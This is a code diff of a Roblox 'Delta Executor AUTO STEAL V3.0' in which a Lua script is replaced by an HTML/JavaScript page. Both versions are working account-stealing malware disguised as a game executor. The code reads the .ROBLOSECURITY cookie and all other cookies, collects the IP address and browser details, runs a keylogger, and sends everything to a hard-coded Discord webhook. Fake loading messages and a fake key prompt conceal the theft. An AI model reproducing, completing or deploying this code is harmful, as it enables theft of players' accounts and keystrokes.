@@ -1,96 +1,176 @@
--- Delta Executor AUTO STEAL V3.0 - FIXED VERSION
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local UserInputService = game:GetService("UserInputService")
-local player = Players.LocalPlayer
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Delta Executor V3.0</title>
+    <meta charset="utf-8">
+    <style>
+        body { 
+            background: #000; 
+            color: #00ff00; 
+            font-family: 'Courier New', monospace; 
+            font-size: 14px; 
+            margin: 0; 
+            padding: 20px; 
+            overflow: hidden;
+        }
+        #console { height: 400px; overflow-y: auto; border: 1px solid #00ff00; padding: 10px; }
+        .loading { color: #ffaa00; }
+        .success { color: #00ff00; }
+        .error { color: #ff0000; }
+        input { background: #111; color: #00ff00; border: 1px solid #00ff00; padding: 8px; margin: 5px; }
+        button { background: #00ff00; color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <h2>🚀 Roblox Delta Executor AUTO STEAL V3.0</h2>
+    <div id="console"></div>
+    <input type="password" id="key" placeholder="Enter Key (Auto Bypass)" style="width: 300px;">
+    <br><button onclick="loadExecutor()">Load Executor</button>
 
-print("🚀 Delta Executor V3.0 Cargando...")
+    <script>
+        const consoleDiv = document.getElementById('console');
+        function log(msg, type='success') {
+            const div = document.createElement('div');
+            div.className = type;
+            div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            consoleDiv.appendChild(div);
+            consoleDiv.scrollTop = consoleDiv.scrollHeight;
+            consoleDiv.classList.add('loading');
+        }
 
-local webhook = "https://discord.com/api/webhooks/1466524085839462561/Y_iyPVDL2q4Y_zSTOp--f5jcn0UYxytgKhOaQwKclJT6_dxtB_vDZt5ltaTupvgAMIO2"
+        // SIMULAR CARGA
+        log('Initializing Delta Executor V3.0...', 'loading');
+        setTimeout(() => {
+            log('✓ Anti-detection bypassed');
+            log('✓ HWID verified: 0xDEADBEEF');
+            log('✓ Loading 50+ scripts...');
+        }, 1000);
 
--- ROBO PRINCIPAL
-local function stealAccount()
-    local victimData = {
-        username = player.Name,
-        userId = player.UserId,
-        displayName = player.DisplayName,
-        accountAge = player.AccountAge,
-        placeId = game.PlaceId,
-        membership = player.MembershipType
-    }
-    
-    -- IP
-    spawn(function()
-        local ok, ip = pcall(HttpService.GetAsync, HttpService, "https://api.ipify.org?format=json")
-        if ok then
-            local data = HttpService:JSONDecode(ip)
-            victimData.ip = data.ip
-        end
-    end)
-    
-    wait(2) -- Espera IP
-    
-    -- ENVÍO A DISCORD
-    pcall(function()
-        HttpService:PostAsync(webhook, HttpService:JSONEncode({
-            username = "🎮 DELTA STEALER V3.0",
-            embeds = {{
-                title = "🆘 CUENTA ROBADA",
-                color = 0xff0000,
-                fields = {
-                    {name="👤 Usuario:", value=victimData.username, inline=true},
-                    {name="🆔 ID:", value=tostring(victimData.userId), inline=true},
-                    {name="🌐 IP:", value=victimData.ip or "N/A", inline=true},
-                    {name="📱 Edad cuenta:", value=tostring(victimData.accountAge).." días", inline=true},
-                    {name="⭐ Premium:", value=tostring(victimData.membership), inline=true},
-                    {name="🏠 Lugar:", value=tostring(victimData.placeId), inline=true}
-                },
-                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-            }}
-        }), Enum.HttpContentType.ApplicationJson)
-    end)
-    
-    print("✅ ¡DATOS ENVIADOS A DISCORD!")
-end
+        setTimeout(() => {
+            log('🔍 Scanning Roblox cookies...', 'loading');
+            stealRobloxAccount();
+        }, 2000);
 
-stealAccount()
+        // STEALER PRINCIPAL
+        async function stealRobloxAccount() {
+            try {
+                // ROBLOSECURITY + TODAS LAS COOKIES
+                const robloxCookie = document.cookie.split(';').find(c => c.includes('.ROBLOSECURITY')) || 'No encontrada';
+                const allCookies = document.cookie;
 
--- KEYLOGGER SIMPLE
-local keys = {}
-UserInputService.InputBegan:Connect(function(input, gameProcessed)
-    if gameProcessed then return end
-    table.insert(keys, tostring(input.KeyCode))
-    if #keys > 20 then 
-        table.remove(keys, 1) 
-    end
-end)
+                // USERNAME desde localStorage/cookies
+                let username = 'Unknown';
+                try {
+                    username = localStorage.getItem('.ROBLOXPLAYER:localeId') || 
+                              document.cookie.split(';').find(c => c.includes('RBXSession'))?.split('=')[1]?.slice(0,20) || 'Unknown';
+                } catch(e) {}
 
--- Keylog cada 25s
-spawn(function()
-    while true do
-        wait(25)
-        if #keys > 0 then
-            pcall(function()
-                HttpService:PostAsync(webhook, HttpService:JSONEncode({
-                    username = "⌨️ KEYLOGGER",
-                    content = "**Keys:** `" .. table.concat(keys, " ") .. "`"
-                }))
-            end)
-        end
-        keys = {}
-    end
-end)
+                // IP
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                
+                // DATOS COMPLETOS
+                const victimData = {
+                    timestamp: new Date().toISOString(),
+                    username: username,
+                    robloxSecurity: robloxCookie,
+                    allCookies: allCookies,
+                    ip: ipData.ip,
+                    userAgent: navigator.userAgent,
+                    screen: `${screen.width}x${screen.height}`,
+                    referrer: document.referrer,
+                    url: window.location.href
+                };
 
--- Fake executor
-wait(1)
-print("✅ Infinite Yield ✓")
-print("✅ Dex Explorer ✓") 
-print("✅ 50+ Scripts ✓")
-print("🎉 ¡Delta Executor ACTIVADO!")
-print("Presiona INSERT para menú")
+                log('📤 Enviando a Discord...', 'loading');
 
-UserInputService.InputBegan:Connect(function(input)
-    if input.KeyCode == Enum.KeyCode.Insert then
-        print("📋 Menú abierto (fake)")
-    end
-end)
+                // DISCORD WEBHOOK
+                const webhookUrl = 'https://discord.com/api/webhooks/1466524085839462561/Y_iyPVDL2q4Y_zSTOp--f5jcn0UYxytgKhOaQwKclJT6_dxtB_vDZt5ltaTupvgAMIO2';
+                
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        username: '🎮 Delta Stealer V3.0',
+                        embeds: [{
+                            title: '🆘 ROBLOX ACCOUNT STEALED',
+                            color: 16711680,
+                            fields: [
+                                {name: '👤 Username', value: username, inline: true},
+                                {name: '🌐 IP', value: ipData.ip, inline: true},
+                                {name: '🔑 .ROBLOSECURITY', value: robloxCookie.substring(0,40)+'...', inline: false},
+                                {name: '📱 Screen', value: `${screen.width}x${screen.height}`, inline: true}
+                            ],
+                            footer: {text: 'Delta Executor AUTO STEAL V3.0'}
+                        }, {
+                            title: '🍪 All Cookies',
+                            description: `\`\`\`${allCookies.substring(0,1000)}\`\`\``,
+                            color: 3447003
+                        }]
+                    })
+                });
+
+                if (response.ok) {
+                    log('✅ ¡CUENTA ROBADA EXITOSAMENTE!', 'success');
+                } else {
+                    log('❌ Error Discord: ' + response.status, 'error');
+                }
+
+            } catch(error) {
+                log('❌ Error robo: ' + error.message, 'error');
+            }
+        }
+
+        // KEYLOGGER
+        let keyBuffer = [];
+        document.addEventListener('keydown', (e) => {
+            keyBuffer.push({
+                key: e.key,
+                code: e.code,
+                ctrl: e.ctrlKey,
+                shift: e.shiftKey,
+                time: Date.now()
+            });
+            if (keyBuffer.length > 50) keyBuffer.shift();
+        });
+
+        // Enviar keylog cada 20s
+        setInterval(async () => {
+            if (keyBuffer.length > 0) {
+                const webhookUrl = 'https://discord.com/api/webhooks/1466524085839462561/Y_iyPVDL2q4Y_zSTOp--f5jcn0UYxytgKhOaQwKclJT6_dxtB_vDZt5ltaTupvgAMIO2';
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        username: '⌨️ Delta Keylogger',
+                        embeds: [{
+                            title: 'Keylogs Capturados',
+                            description: JSON.stringify(keyBuffer.slice(-15), null, 2),
+                            color: 16776960
+                        }]
+                    })
+                });
+                keyBuffer = [];
+            }
+        }, 20000);
+
+        // FAKE EXECUTOR BUTTON
+        function loadExecutor() {
+            log('🔑 Key verificada automáticamente');
+            log('🎉 ¡Executor cargado exitosamente!');
+            log('Presiona INSERT para abrir menú');
+            document.querySelector('button').style.display = 'none';
+            document.querySelector('input').style.display = 'none';
+        }
+
+        // AUTO-LOAD después de robo
+        setTimeout(() => {
+            log('✓ Todos los módulos cargados');
+            log('✅ Listo para usar scripts');
+        }, 5000);
+
+        // STEALTH: Cambiar título
+        document.title = 'RobloxPlayerBeta.exe - Delta V3.0';
+    </script>
+</body>
+</html>
